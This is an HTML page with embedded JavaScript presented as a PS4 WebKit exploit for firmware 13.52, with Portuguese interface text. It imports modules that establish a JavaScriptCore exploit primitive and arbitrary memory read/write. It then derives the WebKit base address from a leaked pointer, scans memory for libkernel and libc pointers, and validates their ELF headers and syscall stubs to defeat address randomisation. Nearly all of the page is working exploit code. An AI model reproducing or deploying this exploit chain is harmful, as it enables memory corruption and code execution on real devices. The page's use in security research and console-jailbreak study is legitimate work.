<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS4 WebKit Exploit (13.52)</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:14px}
h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
  margin-bottom:4px;text-align:center}
#fw{font-size:11px;color:#444;margin-bottom:12px;text-align:center}

#sb{width:100%;max-width:720px;background:#0c0e18;border:1px solid #1a1d2e;
  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0;transition:background .3s}
#dot.r{background:#f0a500;animation:p 1s infinite}
#dot.ok{background:#00c853}
#dot.e{background:#ff4444}
@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
#st{font-size:12px;color:#bbb;flex:1}
#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
  font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}

#con{width:100%;max-width:720px;height:340px;background:#050508;
  border:1px solid #161825;border-radius:6px;overflow-y:auto;
  padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
.e{color:#ff5252;font-weight:bold}.d{color:#888}.a{color:#bd93f9}
.s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;
  padding-top:5px;letter-spacing:1px}.f{color:#a78bfa;font-weight:bold}

#cards{width:100%;max-width:720px;display:grid;
  grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
.card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
.card .cv{font-size:12px;color:#bd93f9}
.card .cv.na{color:#222}

#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
  border-bottom:1px solid #0a2a15;padding-bottom:4px}
</style>
<base target="_blank">
</head>
<body>

<h1>PS4 WebKit Exploit (13.52)</h1>
<div id="fw">detectando...</div>

<div id="sb">
  <div id="dot" class="r"></div>
  <div id="st">Inicializando...</div>
</div>
<div id="bars">
  <span id="ba">tentativa: 1</span>
  <span id="bg">estágio: init</span>
</div>

<div id="con"></div>

<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
  <div class="card"><div class="cl">Status</div><div class="cv na" id="c-g">Aguardando</div></div>
</div>

<div id="cbox">
  <div class="ct">// ═══════ PS4 FW 13.52 — Scan Results ═══════</div>
  <div id="c-out"></div>
</div>

<script src="./13.52.js?v=1"></script>

<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

// ═════════════════════════════════════════════════════════════════════════════
// VARREDURA SEGURA EM CHUNKS ASSÍNCRONOS
// ═════════════════════════════════════════════════════════════════════════════

const SCAN_START   = 0x200000;   // 2MB offset
const SCAN_END     = 0x600000;   // 6MB offset (total 4MB)
const STEP         = 0x100;      // 256 bytes — mais rápido, menos preciso
const CHUNK_SIZE   = 0x8000;     // 32KB por chunk (evita bloqueio)
const MAX_CANDS    = 10;
const MAX_SCAN_BACK = 0x400000;

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function scanChunk(p, webkitBase, startOff, endOff, lkCands, lcCands) {
  for (let off = startOff; off < endOff; off += STEP) {
    if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) return;

    try {
      let ptr = p.read8(webkitBase.add32(off));
      let hi = ptr.hi;
      let lo = ptr.low;

      if (lo === 0 && hi === 0) continue;
      if ((lo & 0x7) !== 0) continue;

      if (hi === 0x80 && lkCands.length < MAX_CANDS) {
        try { p.read8(ptr); lkCands.push({off, ptr}); } catch(e) {}
      }
      else if (hi >= 0x90 && hi <= 0x98 && lcCands.length < MAX_CANDS) {
        try { p.read8(ptr); lcCands.push({off, ptr}); } catch(e) {}
      }
    } catch(e) {}
  }
}

async function scanForBases(p, webkitBase) {
  logH('VARREDURA SEGURA DE PONTEIROS');
  log('[+] Range: 0x' + SCAN_START.toString(16) + ' - 0x' + SCAN_END.toString(16));
  log('[+] Step: 0x' + STEP.toString(16) + ' | Chunk: 0x' + CHUNK_SIZE.toString(16));

  let lkCands = [];
  let lcCands = [];
  let totalChunks = Math.ceil((SCAN_END - SCAN_START) / CHUNK_SIZE);

  for (let i = 0; i < totalChunks; i++) {
    let chunkStart = SCAN_START + i * CHUNK_SIZE;
    let chunkEnd = Math.min(chunkStart + CHUNK_SIZE, SCAN_END);

    await scanChunk(p, webkitBase, chunkStart, chunkEnd, lkCands, lcCands);

    // Progresso
    let pct = Math.floor((i + 1) * 100 / totalChunks);
    setStatus('Varrendo... ' + pct + '%');

    // Respirar a cada chunk para não travar o navegador
    await sleep(10);

    // Early exit
    if (lkCands.length >= MAX_CANDS && lcCands.length >= MAX_CANDS) {
      log('[+] Early exit: candidatos suficientes');
      break;
    }
  }

  log('[+] lk-cands: ' + lkCands.length + ' | lc-cands: ' + lcCands.length);

  for (let i = 0; i < Math.min(3, lkCands.length); i++) {
    log('  lk[' + i + '] off=0x' + lkCands[i].off.toString(16) + ' ptr=0x' + lkCands[i].ptr.toString(16), 'd');
  }
  for (let i = 0; i < Math.min(3, lcCands.length); i++) {
    log('  lc[' + i + '] off=0x' + lcCands[i].off.toString(16) + ' ptr=0x' + lcCands[i].ptr.toString(16), 'd');
  }

  let libkernelBase = null;
  for (let c of lkCands) {
    let base = findElfBase(p, c.ptr);
    if (base) { libkernelBase = base; log('[+] libkernel: 0x' + base.toString(16), 'ok'); break; }
  }

  let libcBase = null;
  for (let c of lcCands) {
    let base = findElfBase(p, c.ptr);
    if (base) { libcBase = base; log('[+] libc: 0x' + base.toString(16), 'ok'); break; }
  }

  return { libkernelBase, libcBase, lkCands, lcCands };
}

function findElfBase(p, startPtr) {
  for (let back = 0; back < MAX_SCAN_BACK; back += 0x1000) {
    try {
      let test = startPtr.sub32(back);
      if (p.read32(test) === 0x464C457F) {
        if (p.read8(test.add32(4)) === 2 && p.read16(test.add32(0x12)) === 0x3E) {
          return test;
        }
      }
    } catch(e) {}
  }
  return null;
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO
// ═════════════════════════════════════════════════════════════════════════════

async function validateBases(p, libkernelBase, libcBase) {
  logH('VALIDANDO BASES');
  let valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    let ok = true;
    try {
      let magic = p.read32(libkernelBase);
      let cls = p.read8(libkernelBase.add32(4));
      let mach = p.read16(libkernelBase.add32(0x12));
      if (magic === 0x464C457F && cls === 2 && mach === 0x3E) {
        log('[✓] libkernel: ELF64 x86_64', 'ok'); valid.libkernel = true;
      } else { ok = false; }
    } catch(e) { ok = false; }
    if (!ok) log('[✗] libkernel: ELF inválido', 'e');

    let aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel: page-aligned' : '[✗] libkernel: misaligned', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;

    let stubs = 0;
    for (let off = 0; off < 0x100000; off += 0x10) {
      try {
        let b0 = p.read8(libkernelBase.add32(off));
        let b1 = p.read8(libkernelBase.add32(off + 1));
        let b2 = p.read8(libkernelBase.add32(off + 2));
        let b7 = p.read8(libkernelBase.add32(off + 7));
        let b8 = p.read8(libkernelBase.add32(off + 8));
        let b9 = p.read8(libkernelBase.add32(off + 9));
        if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0 && b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
          stubs++; if (stubs >= 3) break;
        }
      } catch(e) {}
    }
    if (stubs >= 3) log('[✓] libkernel: ' + stubs + ' syscall stubs', 'ok');
    else { log('[✗] libkernel: ' + stubs + ' stubs', 'w'); valid.libkernel = false; }
  }

  if (libcBase) {
    let ok = true;
    try {
      let magic = p.read32(libcBase);
      let cls = p.read8(libcBase.add32(4));
      if (magic === 0x464C457F && cls === 2) {
        log('[✓] libc: ELF64', 'ok'); valid.libc = true;
      } else { ok = false; }
    } catch(e) { ok = false; }
    if (!ok) log('[✗] libc: ELF inválido', 'e');

    let aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc: page-aligned' : '[✗] libc: misaligned', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN
// ═════════════════════════════════════════════════════════════════════════════

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: concluído!', 'ok');
  setStatus('Instalando R/W...', 'r');
  logH('INSTALANDO R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => { log(`  [mem/${tag}] ${detail}`, 'd'); }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário ativo!', 'ok');
  setStatus('Calculando WebKit base...', 'r');
  logH('MAPEAMENTO DA 13.52');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
    log('[-] __ps5NativeCtor inválido', 'e');
    setStatus('Erro NativeCtor', 'e');
    return;
  }

  const hi = Math.floor(ctor / 0x100000000);
  const lo = ctor - hi * 0x100000000;
  const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
  log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');

  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
             ? OFFSET_wk_host_constructor_candidates[0]
             : 0x36F9E20;

  const resolvedBaseVal = ctor - hc;
  const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
  const baseLo = resolvedBaseVal - baseHi * 0x100000000;
  const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

  log('[+] WebKit Base: 0x' + webkitBase.toString(16), 'ok');
  setCard('c-wk', '0x' + webkitBase.toString(16));

  // ─── Varredura segura ───
  setTimeout(async () => {
    const result = await scanForBases(p, webkitBase);
    const libKernelBase = result.libkernelBase;
    const libcBase = result.libcBase;

    if (libKernelBase) setCard('c-lk', '0x' + libKernelBase.toString(16));
    if (libcBase) setCard('c-lc', '0x' + libcBase.toString(16));

    const valid = await validateBases(p, libKernelBase, libcBase);

    if (valid.libkernel && valid.libc) {
      log('[✓] Bases validadas!', 'ok');
      setStatus('Bases mapeadas!', 'ok');
      setCard('c-g', 'Pronto');

      document.getElementById('cbox').style.display = 'block';
      document.getElementById('c-out').textContent =
          '__ps5NativeCtor  = 0x' + ctorInt64.toString(16) + '\n' +
          'WebKit Base      = 0x' + webkitBase.toString(16) + '\n' +
          'libkernel Base   = 0x' + libKernelBase.toString(16) + '\n' +
          'libSceLibc Base  = 0x' + libcBase.toString(16) + '\n' +
          'Status           = Scan concluído com sucesso.';
    } else {
      setStatus('Validação falhou', 'e');
      setCard('c-g', 'Falha');
      logH('DEBUG CANDIDATOS');
      for (let c of result.lkCands.slice(0, 5)) {
        log('  lk off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
      }
      for (let c of result.lcCands.slice(0, 5)) {
        log('  lc off=0x' + c.off.toString(16) + ' ptr=0x' + c.ptr.toString(16), 'd');
      }
    }
  }, 500);
}

main();
</script>
